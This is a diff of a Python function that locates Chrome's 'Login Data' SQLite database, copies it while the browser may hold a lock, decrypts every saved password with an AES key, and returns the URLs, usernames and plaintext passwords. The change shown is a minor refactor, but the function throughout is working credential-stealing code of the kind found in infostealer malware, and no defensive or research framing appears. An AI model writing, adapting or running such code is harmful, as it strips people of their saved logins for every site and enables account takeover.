@@ -44,8 +44,7 @@ def return_chrome_creds(filename):
     # get the AES key
     key = get_encryption_key()
     # local sqlite Chrome database path
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                           "Google", "Chrome", "User Data", "default", "Login Data")
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
     # copy the file to another location
     # as the database will be locked if chrome is currently running
     shutil.copyfile(db_path, filename)
@@ -55,19 +54,16 @@ def return_chrome_creds(filename):
     # `logins` table has the data we need
     cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
     # iterate over all rows
-    array = []
+    creds = []
     for row in cursor.fetchall():
         origin_url = row[0]
         action_url = row[1]
         username = row[2]
         password = decrypt_password(row[3], key)
         if username or password:
-            array.append({"origin_url": origin_url,
-                          "action_url": action_url,
-                          "username": username,
-                          "password": password})
+            creds.append((origin_url, action_url, username, password))
         else:
             continue
     cursor.close()
     db.close()
-    return array
+    return creds
